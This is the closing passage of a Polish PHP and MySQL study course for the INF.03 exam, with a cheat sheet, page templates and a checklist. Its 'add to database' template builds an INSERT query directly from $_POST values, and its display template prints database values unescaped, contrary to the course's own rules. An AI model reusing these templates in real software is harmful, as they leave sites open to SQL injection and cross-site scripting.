// Zapytanie UPDATE
$sql = "UPDATE produkty SET cena = cena * 1.15 WHERE kategoria = 'sport'";

if (mysqli_query($conn, $sql)) {
    $zaktualizowane = mysqli_affected_rows($conn);
    echo "✅ Zaktualizowano $zaktualizowane produktów";
} else {
    echo "❌ Błąd: " . mysqli_error($conn);
}

mysqli_close($conn);
?>
```

---

## **Przydatne linki i zasoby**

- **Oficjalna dokumentacja PHP:** https://www.php.net/manual/pl/
- **W3Schools PHP Tutorial:** https://www.w3schools.com/php/
- **PHP: The Right Way:** https://phptherightway.com/
- **XAMPP:** https://www.apachefriends.org/
- **PHPMyAdmin:** Dostępny w XAMPP (localhost/phpmyadmin)

---

## **Końcowe wskazówki dla uczniów**

### **Jak się uczyć PHP?**

1. **Ćwicz regularnie** - programowanie to umiejętność praktyczna
2. **Pisz kod ręcznie** - nie kopiuj ślepo
3. **Eksperymentuj** - zmieniaj kod i patrz co się stanie
4. **Debuguj** - używaj `var_dump()`, `print_r()` do sprawdzania zmiennych
5. **Czytaj kod innych** - ucz się z przykładów

### **Podczas nauki włącz wyświetlanie błędów:**

```php
<?php
    error_reporting(E_ALL);
    ini_set('display_errors', 1);
?>
```

### **Jak przygotować się do egzaminu INF.03?**

1. ✅ Zrób WSZYSTKIE przykłady z kursu
2. ✅ Rozwiąż zadania praktyczne
3. ✅ Przećwicz przykładowe arkusze egzaminacyjne
4. ✅ Naucz się na pamięć składni podstawowych konstrukcji
5. ✅ Potrenuj tworzenie prostych aplikacji od zera
6. ✅ Zwróć szczególną uwagę na:
   - Formularze (POST/GET)
   - Połączenie z bazą MySQL
   - Prepared Statements
   - SELECT, INSERT, UPDATE, DELETE
   - Pętle (szczególnie foreach)
   - Walidacja danych

### **Złote zasady programisty PHP:**

1. **ZAWSZE** używaj Prepared Statements
2. **ZAWSZE** używaj `htmlspecialchars()` przy wyświetlaniu danych użytkownika
3. **NIGDY** nie przechowuj haseł w czystej postaci
4. **ZAWSZE** waliduj dane wejściowe
5. **Testuj** swój kod - czy działa poprawnie?
6. **Komentuj** skomplikowane fragmenty
7. **Używaj znaczących nazw** zmiennych i funkcji

---

## **ŚCIĄGAWKA - SZYBKIE POWTÓRKI PRZED EGZAMINEM INF.03**

### **FUNKCJE mysqli - MUSISZ ZNAĆ NA PAMIĘĆ!**

```php
// 1. POŁĄCZENIE
$conn = mysqli_connect("localhost", "root", "", "nazwa_bazy");
if (!$conn) die("Błąd: " . mysqli_connect_error());
mysqli_set_charset($conn, "utf8");

// Alternatywnie - połączenie bez bazy + wybór bazy
$conn = mysqli_connect("localhost", "root", "");
mysqli_select_db($conn, "nazwa_bazy");

// 2. SELECT - pobieranie
$sql = "SELECT * FROM tabela";
$wynik = mysqli_query($conn, $sql);

// Sprawdzenie czy są wyniki
if (mysqli_num_rows($wynik) > 0) {
    // Pobieranie z mysqli_fetch_array() - dostęp po nazwie kolumny
    while ($wiersz = mysqli_fetch_array($wynik)) {
        echo $wiersz["kolumna"];
    }
    
    // LUB mysqli_fetch_row() - dostęp tylko po indeksie [0], [1], [2]...
    while ($wiersz = mysqli_fetch_row($wynik)) {
        echo $wiersz[0];  // pierwsza kolumna
    }
}

// Sprawdzenie liczby kolumn (rzadko używane)
$liczba_kolumn = mysqli_num_fields($wynik);

// 3. INSERT - dodawanie
$sql = "INSERT INTO tabela (kol1, kol2) VALUES ('war1', 'war2')";
if (mysqli_query($conn, $sql)) {
    $noweID = mysqli_insert_id($conn);  // ID nowo dodanego rekordu
    echo "Dodano rekord o ID: $noweID";
} else {
    echo "Błąd: " . mysqli_error($conn);  // Wyświetlenie błędu
}

// 4. UPDATE - aktualizacja
$sql = "UPDATE tabela SET kolumna='nowa' WHERE id=1";
mysqli_query($conn, $sql);
$zmienione = mysqli_affected_rows($conn);  // Ile wierszy zmieniono

// 5. DELETE - usuwanie
$sql = "DELETE FROM tabela WHERE id=1";
mysqli_query($conn, $sql);

// 6. Zabezpieczenie przed SQL Injection
$tekst_od_uzytkownika = mysqli_real_escape_string($conn, $_POST["dane"]);

// 7. ZAMKNIJ (OBOWIĄZKOWO NA EGZAMINIE!)
mysqli_close($conn);
```

**⚠️ UWAGA EGZAMIN:** Wszystkie powyższe funkcje są z oficjalnej dokumentacji CKE i mogą pojawić się na egzaminie!

### **ZAPYTANIA SQL - NAJCZĘŚCIEJ NA EGZAMINIE**

```sql
-- SELECT z WHERE
SELECT * FROM produkty WHERE cena > 100;

-- SELECT z LIKE (wyszukiwanie)
SELECT * FROM klienci WHERE nazwisko LIKE 'Kow%';

-- SELECT z ORDER BY (sortowanie)
SELECT * FROM produkty ORDER BY cena DESC;

-- SELECT z LIMIT
SELECT * FROM produkty ORDER BY cena DESC LIMIT 5;

-- JOIN (łączenie tabel)
SELECT klienci.imie, zamowienia.produkt 
FROM zamowienia 
INNER JOIN klienci ON zamowienia.klient_id = klienci.id;

-- GROUP BY (grupowanie)
SELECT kategoria, COUNT(*) as ilosc 
FROM produkty 
GROUP BY kategoria;

-- GROUP BY z HAVING
SELECT kategoria, COUNT(*) as ilosc 
FROM produkty 
GROUP BY kategoria 
HAVING ilosc > 10;

-- Funkcje agregujące
SELECT COUNT(*) FROM produkty;              -- Liczba
SELECT AVG(cena) FROM produkty;             -- Średnia
SELECT SUM(cena) FROM produkty;             -- Suma
SELECT MIN(cena), MAX(cena) FROM produkty;  -- Min i Max

-- Funkcje daty
INSERT INTO zamowienia (data) VALUES (CURRENT_DATE());
SELECT NOW() as teraz;

-- DISTINCT (unikalne)
SELECT DISTINCT miasto FROM klienci;

-- BETWEEN (zakres)
SELECT * FROM produkty WHERE cena BETWEEN 50 AND 150;

-- IN (lista wartości)
SELECT * FROM produkty WHERE kategoria IN ('AGD', 'RTV');

-- ALTER TABLE (modyfikacja struktury)
ALTER TABLE produkty ADD opis TEXT;
ALTER TABLE produkty DROP COLUMN stary_kod;
ALTER TABLE produkty MODIFY cena DECIMAL(10,2);
```

### **FUNKCJE PHP - NAJWAŻNIEJSZE**

#### **Tekstowe:**
```php
strlen($tekst)              // Długość
strtoupper($tekst)          // WIELKIE LITERY
strtolower($tekst)          // małe litery
trim($tekst)                // Usuń spacje
str_replace("a", "b", $txt) // Zamień a na b
substr($tekst, 0, 5)        // Pierwsze 5 znaków
explode(",", "a,b,c")       // String → tablica
implode(",", $tablica)      // Tablica → string
```

#### **Tablice:**
```php
count($tab)                 // Liczba elementów
in_array($val, $tab)        // Czy istnieje?
array_push($tab, $val)      // Dodaj na końcu
sort($tab)                  // Sortuj
```

#### **Sprawdzanie:**
```php
isset($zmienna)             // Czy istnieje?
empty($zmienna)             // Czy pusta?
is_numeric($war)            // Czy liczba?
```

#### **Data i czas:**
```php
date("Y-m-d")              // 2025-01-15
date("H:i:s")              // 14:30:45
time()                     // Timestamp
```

### **FORMULARZE - SCHEMAT**

**HTML:**
```html
<form method="POST" action="przetwarzanie.php">
    <input type="text" name="pole" required>
    <button type="submit">Wyślij</button>
</form>
```

**PHP:**
```php
<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $wartosc = $_POST["pole"];
    // Przetwarzanie...
}
?>
```

### **KOMPLETNY SZABLON - WYŚWIETLANIE Z BAZY**

```php
<!DOCTYPE html>
<html lang="pl">
<head>
    <meta charset="UTF-8">
    <title>Strona</title>
    <link rel="stylesheet" href="styl.css">
</head>
<body>
    <header>
        <h1>Nagłówek</h1>
    </header>
    
    <section>
        <?php
        $conn = mysqli_connect("localhost", "root", "", "baza");
        
        if (!$conn) {
            die("Błąd: " . mysqli_connect_error());
        }
        
        mysqli_set_charset($conn, "utf8");
        
        $sql = "SELECT * FROM tabela";
        $wynik = mysqli_query($conn, $sql);
        
        if (mysqli_num_rows($wynik) > 0) {
            echo "<table>";
            while ($wiersz = mysqli_fetch_array($wynik)) {
                echo "<tr>";
                echo "<td>" . $wiersz["kolumna"] . "</td>";
                echo "</tr>";
            }
            echo "</table>";
        }
        
        mysqli_close($conn);
        ?>
    </section>
    
    <footer>
        <p>Stopka</p>
    </footer>
</body>
</html>
```

### **KOMPLETNY SZABLON - DODAWANIE DO BAZY**

```php
<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $conn = mysqli_connect("localhost", "root", "", "baza");
    mysqli_set_charset($conn, "utf8");
    
    $pole1 = $_POST["pole1"];
    $pole2 = $_POST["pole2"];
    
    $sql = "INSERT INTO tabela (kolumna1, kolumna2) VALUES ('$pole1', '$pole2')";
    
    if (mysqli_query($conn, $sql)) {
        echo "Dodano pomyślnie!";
    } else {
        echo "Błąd: " . mysqli_error($conn);
    }
    
    mysqli_close($conn);
}
?>

<form method="POST">
    <input type="text" name="pole1" required>
    <input type="text" name="pole2" required>
    <button type="submit">Dodaj</button>
</form>
```

### **CHECKLIST NA DZIEŃ PRZED EGZAMINEM**

#### **Funkcje mysqli (powtórz!):**
- [ ] `mysqli_connect()` - połączenie
- [ ] `mysqli_query()` - wykonanie zapytania
- [ ] `mysqli_fetch_array()` - pobieranie wiersza
- [ ] `mysqli_num_rows()` - liczba wierszy
- [ ] `mysqli_affected_rows()` - zmienione wiersze
- [ ] `mysqli_close()` - ZAMKNIJ!
- [ ] `mysqli_error()` - komunikat błędu

#### **SQL (powtórz!):**
- [ ] SELECT ... FROM ... WHERE ... ORDER BY ... LIMIT
- [ ] INSERT INTO ... VALUES
- [ ] UPDATE ... SET ... WHERE
- [ ] DELETE FROM ... WHERE
- [ ] INNER JOIN ... ON
- [ ] GROUP BY ... HAVING
- [ ] COUNT, AVG, SUM, MIN, MAX
- [ ] CURRENT_DATE(), NOW()
- [ ] LIKE, BETWEEN, IN, DISTINCT

#### **PHP (powtórz!):**
- [ ] Pętla `while` z `mysqli_fetch_array()`
- [ ] `$_POST`, `$_GET`
- [ ] `isset()`, `empty()`
- [ ] `htmlspecialchars()`
- [ ] `date()`, `time()`
- [ ] `count()`, `in_array()`
- [ ] `explode()`, `implode()`

#### **Na egzaminie PAMIĘTAJ:**
- [ ] Zaimportuj bazę SQL do phpMyAdmin
- [ ] Wykonaj każde zapytanie i zrób zrzut ekranu
- [ ] Zapisz zapytania do `kwerendy.txt`
- [ ] Sprawdź czy Apache i MySQL działają
- [ ] Testuj stronę w przeglądarce po każdej zmianie
- [ ] ZAWSZE zamykaj połączenie `mysqli_close()`
- [ ] Używaj `utf8` dla polskich znaków
- [ ] Nazywaj pliki dokładnie jak w poleceniu

---

**Powodzenia na egzaminie INF.03! 🚀**

Pamiętaj: Praktyka czyni mistrza. Im więcej kodu napiszesz, tym lepiej będziesz programować!

---

*Kurs stworzony specjalnie dla uczniów przygotowujących się do egzaminu zawodowego INF.03*
*Wersja rozszerzona i kompleksowa - wszystko czego potrzebujesz w jednym miejscu!*